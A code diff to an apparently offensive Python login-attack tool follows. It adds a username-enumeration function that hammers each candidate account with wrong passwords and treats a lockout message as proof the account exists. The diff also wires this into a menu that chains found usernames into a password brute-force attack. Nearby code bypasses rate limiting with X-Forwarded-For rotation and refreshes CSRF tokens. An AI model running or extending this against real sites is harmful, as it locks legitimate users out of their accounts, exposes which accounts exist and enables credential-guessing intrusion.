@@ -502,6 +502,108 @@ def username_enum(url, username_file, fail_string, password, delay, use_xff):
     return valid_usernames
 
 
+def username_enum_lockout(url, username_file, lockout_phrase, attempts_per_user, delay):
+    """
+    Username enumeration via account-lockout side channel.
+
+    Some apps only track failed-attempt counts for usernames that actually
+    exist. Hammering a non-existent username with wrong passwords never
+    changes the response; hammering a REAL username eventually trips its
+    lockout, and the response changes to a distinct lockout message. That
+    message is the oracle here -- not a fixed-password response difference.
+
+    For each candidate username, fires `attempts_per_user` wrong-password
+    attempts in a row, then checks the LAST response for the lockout
+    phrase (falling back to the generic BLOCK_INDICATORS list too).
+    """
+    print(colored("\n[*] Starting lockout-triggered username enumeration...", 'cyan'))
+
+    try:
+        with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
+            usernames = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        print(colored(f"[-] Username file not found: {username_file}", 'red'))
+        return []
+
+    total = len(usernames)
+    print(colored(f"[*] Loaded {total} usernames from wordlist", 'cyan'))
+    print(colored(f"[*] Wrong-password attempts per username: {attempts_per_user}", 'cyan'))
+
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    })
+    session.get(url, timeout=10)
+
+    method, action, all_fields, _ = detect_form(url, session)
+    if not method:
+        print(colored("[-] Could not detect form -- exiting", 'red'))
+        return []
+
+    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
+    submit_fields = {k: v for k, v in all_fields.items() if k.lower() in submit_field_names}
+    input_fields = {k: v for k, v in all_fields.items() if k.lower() not in submit_field_names}
+
+    username_field, password_field = identify_fields(input_fields, submit_fields)
+    csrf_field = detect_csrf_field(input_fields)
+
+    print(colored(f"\n[*] Enumeration started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
+    print(colored("=" * 55, 'cyan'))
+
+    valid_usernames = []
+    wrong_passwords = [f"wrongpass{i}" for i in range(1, attempts_per_user + 1)]
+
+    for ucount, username in enumerate(usernames, 1):
+        last_response_text = ""
+
+        for acount, wrong_password in enumerate(wrong_passwords, 1):
+            if csrf_field:
+                fresh_token = get_fresh_token(url, session, csrf_field)
+                if fresh_token:
+                    all_fields[csrf_field] = fresh_token
+
+            all_fields[username_field] = username
+            all_fields[password_field] = wrong_password
+
+            sys.stdout.write(colored(
+                f"\r  [*] User ({ucount}/{total}): {username:<25} attempt {acount}/{attempts_per_user}",
+                'red'))
+            sys.stdout.flush()
+
+            try:
+                if method == 'post':
+                    response = session.post(action, data=all_fields.copy(), timeout=10,
+                                            allow_redirects=True)
+                else:
+                    response = session.get(action, params=all_fields.copy(), timeout=10,
+                                           allow_redirects=True)
+                time.sleep(delay)
+                last_response_text = response.text
+            except requests.exceptions.ConnectionError:
+                print(colored("\n[!] Connection error -- sleeping 5s", 'red'))
+                time.sleep(5)
+            except requests.exceptions.Timeout:
+                pass
+
+        locked = (lockout_phrase and lockout_phrase in last_response_text) or \
+                 is_blocked_response(last_response_text)
+        if locked:
+            print(colored(f"\n  [!] VALID USERNAME (locked out): {username}", 'green'))
+            valid_usernames.append(username)
+
+    print(colored(f"\n\n[*] Enumeration complete at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
+
+    if valid_usernames:
+        print(colored(f"\n[+] Valid usernames found: {valid_usernames}", 'green'))
+        chain = input(colored("\n[*] Chain into password attack on found usernames? (y/n): ", 'cyan')).strip().lower()
+        if chain == 'y':
+            return valid_usernames
+    else:
+        print(colored("[-] No valid usernames found", 'red'))
+
+    return valid_usernames
+
+
 # ════════════════════════════════════════════════════════════════
 #  DECOY-INTERLEAVED ATTACK (MODE 9)
 #  For brute-force protections where the failed-attempt counter resets
@@ -758,24 +860,48 @@ def main():
             ftp_attack(host, port, usernames, password_file, delay)
 
     elif mode == '8':
+        print(colored("\n[*] Username enumeration method:", 'cyan'))
+        print(colored("  1. Fixed-password response difference (default)", 'white'))
+        print(colored("  2. Account-lockout trigger (hammer N wrong passwords per username)", 'white'))
+        enum_method = input(colored("[*] Enter method (1-2, default 1): ", 'cyan')).strip()
+
         url = input(colored("[*] Enter target login URL: ", 'cyan'))
         username_file = input(colored("[*] Enter path to username wordlist: ", 'cyan')).strip()
-        fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
-        password = input(colored("[*] Enter fixed password to use (default: password): ", 'cyan')).strip()
-        if not password:
-            password = 'password'
-        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
-        delay = float(delay) if delay.strip() else 0.5
-        xff = input(colored("[*] Enable X-Forwarded-For IP rotation to bypass rate limiting? (y/n): ", 'cyan')).strip().lower()
-        use_xff = xff == 'y'
+        fail_string = None  # only set by method 1; method 2 has no equivalent
 
-        valid_usernames = username_enum(url, username_file, fail_string, password, delay, use_xff)
+        if enum_method == '2':
+            lockout_phrase = input(colored(
+                "[*] Lockout message text (e.g. 'You have made too many incorrect login attempts'), "
+                "ENTER to rely on auto-detection only: ", 'cyan')).strip()
+            attempts_input = input(colored(
+                "[*] Wrong-password attempts per username (default 4): ", 'cyan')).strip()
+            attempts_per_user = int(attempts_input) if attempts_input else 4
+            delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
+            delay = float(delay) if delay.strip() else 0.5
+
+            valid_usernames = username_enum_lockout(url, username_file, lockout_phrase,
+                                                     attempts_per_user, delay)
+        else:
+            fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
+            password = input(colored("[*] Enter fixed password to use (default: password): ", 'cyan')).strip()
+            if not password:
+                password = 'password'
+            delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
+            delay = float(delay) if delay.strip() else 0.5
+            xff = input(colored("[*] Enable X-Forwarded-For IP rotation to bypass rate limiting? (y/n): ", 'cyan')).strip().lower()
+            use_xff = xff == 'y'
+
+            valid_usernames = username_enum(url, username_file, fail_string, password, delay, use_xff)
 
         if valid_usernames:
             chain = input(colored("\n[*] Run password attack on found usernames now? (y/n): ", 'cyan')).strip().lower()
             if chain == 'y':
-                fail_string2 = input(colored("[*] Fail string for password attack (ENTER to reuse same): ", 'cyan')).strip()
+                reuse_hint = "ENTER to reuse same" if fail_string else "required -- the lockout method has no equivalent to reuse"
+                fail_string2 = input(colored(f"[*] Fail string for password attack ({reuse_hint}): ", 'cyan')).strip()
                 if not fail_string2:
+                    if not fail_string:
+                        print(colored("[-] A fail string is required for the password attack -- aborting chain", 'red'))
+                        return
                     fail_string2 = fail_string
                 delay2 = input(colored("[*] Delay for password attack (default 0.5): ", 'cyan'))
                 delay2 = float(delay2) if delay2.strip() else 0.5
